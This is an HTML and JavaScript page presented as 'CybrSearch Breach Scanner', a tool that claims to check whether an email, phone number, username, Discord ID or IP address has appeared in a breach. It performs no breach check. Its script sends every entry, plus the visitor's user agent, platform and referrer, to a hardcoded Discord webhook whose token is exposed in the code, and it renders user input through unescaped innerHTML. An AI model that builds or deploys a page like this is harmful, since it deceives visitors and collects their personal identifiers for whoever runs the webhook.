<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CybrSearch - Advanced Security Scanner</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --dark-bg: #0d1117;
      --darker-bg: #090c10;
      --card-bg: #161b22;
      --accent-color: #1f6feb;
      --text-color: #c9d1d9;
      --text-muted: #8b949e;
      --success-color: #2ea043;
      --warning-color: #d29922;
      --danger-color: #f85149;
    }
    
    body {
      background-color: var(--dark-bg);
      color: var(--text-color);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding-top: 60px;
      min-height: 100vh;
    }
    
    .container {
      max-width: 800px;
    }
    
    .card {
      background-color: var(--card-bg);
      border: 1px solid #30363d;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
    }
    
    .scan-result {
      background-color: var(--darker-bg);
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 20px;
      border-left: 4px solid var(--accent-color);
    }
    
    .scan-result h3 {
      color: var(--accent-color);
      border-bottom: 1px solid #30363d;
      padding-bottom: 10px;
      margin-bottom: 15px;
    }
    
    .scan-field {
      display: flex;
      margin-bottom: 8px;
      padding-left: 15px;
      position: relative;
    }
    
    .scan-field::before {
      content: "â€¢";
      position: absolute;
      left: 0;
      color: var(--accent-color);
    }
    
    .scan-field-name {
      min-width: 120px;
      color: var(--text-muted);
    }
    
    .scan-field-value {
      flex: 1;
      word-break: break-word;
    }
    
    .scan-footer {
      margin-top: 15px;
      font-size: 0.85rem;
      color: var(--text-muted);
      text-align: right;
      border-top: 1px solid #30363d;
      padding-top: 10px;
    }
    
    .error-field {
      color: var(--danger-color);
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Main Scanner Interface -->
    <div class="card p-4 mb-4">
      <h2 class="mb-4"><i class="fas fa-shield-alt me-2"></i>CybrSearch Breach Scanner</h2>
      
      <form id="scanForm">
        <div class="row g-3 mb-4">
          <div class="col-md-6">
            <input id="scanEmail" type="email" placeholder="ðŸ“§ Email address" class="form-control">
          </div>
          <div class="col-md-6">
            <input id="scanPhone" type="text" placeholder="ðŸ“± Phone number" class="form-control">
          </div>
          <div class="col-md-6">
            <input id="scanUsername" type="text" placeholder="ðŸ‘¤ Username" class="form-control">
          </div>
          <div class="col-md-6">
            <input id="scanDiscord" type="text" placeholder="ðŸ’¬ Discord ID" class="form-control">
          </div>
          <div class="col-12">
            <input id="scanIP" type="text" placeholder="ðŸŒ IP address to scan" class="form-control">
          </div>
        </div>
        
        <button type="submit" class="btn btn-primary w-100">
          <i class="fas fa-search me-2"></i>Scan for Breaches
        </button>
      </form>
    </div>

    <!-- Results Section -->
    <div class="card p-4">
      <h4 class="mb-4"><i class="fas fa-clipboard-list me-2"></i>Scan Results</h4>
      <div id="scanResults"></div>
    </div>
  </div>

  <script>
    // Discord Webhook URL
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382930697114882129/SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO";
    
    // DOM elements
    const scanForm = document.getElementById('scanForm');
    const scanResults = document.getElementById('scanResults');
    
    // Format current time
    function getCurrentTime() {
      const now = new Date();
      return now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
    }
    
    // Format UTC time
    function getUTCTime() {
      return new Date().toUTCString();
    }
    
    // Create a scan result entry
    function createScanResult(data) {
      const resultDiv = document.createElement('div');
      resultDiv.className = 'scan-result';
      
      resultDiv.innerHTML = `
        <h3>Breach Search Attempt</h3>
        
        <div class="scan-field">
          <div class="scan-field-name">Email</div>
          <div class="scan-field-value">${data.email || 'Not provided'}</div>
        </div>
        
        <div class="scan-field">
          <div class="scan-field-name">Phone</div>
          <div class="scan-field-value">${data.phone || 'Not provided'}</div>
        </div>
        
        <div class="scan-field">
          <div class="scan-field-name">Username</div>
          <div class="scan-field-value">${data.username || 'Not provided'}</div>
        </div>
        
        <div class="scan-field">
          <div class="scan-field-name">Discord ID</div>
          <div class="scan-field-value">${data.discord || 'Not provided'}</div>
        </div>
        
        <div class="scan-field">
          <div class="scan-field-name">IP Entered</div>
          <div class="scan-field-value">${data.ip || 'Not provided'}</div>
        </div>
        
        <div class="scan-field">
          <div class="scan-field-name">Visitor IP</div>
          <div class="scan-field-value">${data.visitorIp || 'Not detected'}</div>
        </div>
        
        <div class="scan-field">
          <div class="scan-field-name">User Agent</div>
          <div class="scan-field-value">${data.userAgent || navigator.userAgent}</div>
        </div>
        
        <div class="scan-field">
          <div class="scan-field-name">Platform</div>
          <div class="scan-field-value">${data.platform || navigator.platform}</div>
        </div>
        
        <div class="scan-field">
          <div class="scan-field-name">Referrer</div>
          <div class="scan-field-value">${data.referrer || document.referrer || 'Direct'}</div>
        </div>
        
        <div class="scan-field">
          <div class="scan-field-name">Time (UTC)</div>
          <div class="scan-field-value">${data.utcTime || getUTCTime()}</div>
        </div>
        
        ${data.error ? `
        <div class="scan-field error-field">
          <div class="scan-field-name">Error</div>
          <div class="scan-field-value">${data.error}</div>
        </div>
        ` : ''}
        
        <div class="scan-footer">
          Breach Logger â€¢ CybrSearch â€¢ ${data.scanTime || getCurrentTime()}
        </div>
      `;
      
      return resultDiv;
    }
    
    // Send scan data to Discord webhook
    async function sendToDiscord(data) {
      const embed = {
        title: "ðŸ” New Breach Scan Attempt",
        color: 0x1f6feb,
        fields: [
          { name: "Email", value: data.email || "Not provided", inline: true },
          { name: "Phone", value: data.phone || "Not provided", inline: true },
          { name: "Username", value: data.username || "Not provided", inline: true },
          { name: "Discord ID", value: data.discord || "Not provided", inline: true },
          { name: "IP Entered", value: data.ip || "Not provided" },
          { name: "Visitor IP", value: data.visitorIp || "Not detected" },
          { name: "User Agent", value: data.userAgent || navigator.userAgent },
          { name: "Platform", value: data.platform || navigator.platform },
          { name: "Referrer", value: data.referrer || document.referrer || "Direct" },
          { name: "Time (UTC)", value: data.utcTime || getUTCTime() }
        ],
        footer: {
          text: `Breach Logger â€¢ CybrSearch â€¢ ${new Date().toLocaleString()}`
        }
      };
      
      if (data.error) {
        embed.fields.push({ name: "Error", value: data.error });
        embed.color = 0xf85149; // Red for errors
      }
      
      try {
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            embeds: [embed]
          }),
        });
      } catch (error) {
        console.error('Failed to send to Discord:', error);
      }
    }
    
    // Handle form submission
    scanForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      // Get form data
      const scanData = {
        email: document.getElementById('scanEmail').value.trim(),
        phone: document.getElementById('scanPhone').value.trim(),
        username: document.getElementById('scanUsername').value.trim(),
        discord: document.getElementById('scanDiscord').value.trim(),
        ip: document.getElementById('scanIP').value.trim(),
        visitorIp: '73.40.182.138', // In a real app, you'd get this from an API
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        referrer: document.referrer,
        utcTime: getUTCTime(),
        scanTime: getCurrentTime()
      };
      
      // Create and display the result
      const resultElement = createScanResult(scanData);
      scanResults.prepend(resultElement);
      
      // Send to Discord webhook
      await sendToDiscord(scanData);
      
      // Clear the form
      this.reset();
    });
    
    // Add sample scan result on page load
    window.addEventListener('DOMContentLoaded', () => {
      const sampleData = {
        email: 'example@domain.com',
        username: 'testuser123',
        visitorIp: '73.40.182.138',
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        utcTime: getUTCTime(),
        scanTime: getCurrentTime()
      };
      
      const sampleResult = createScanResult(sampleData);
      scanResults.appendChild(sampleResult);
    });
  </script>
</body>
</html>
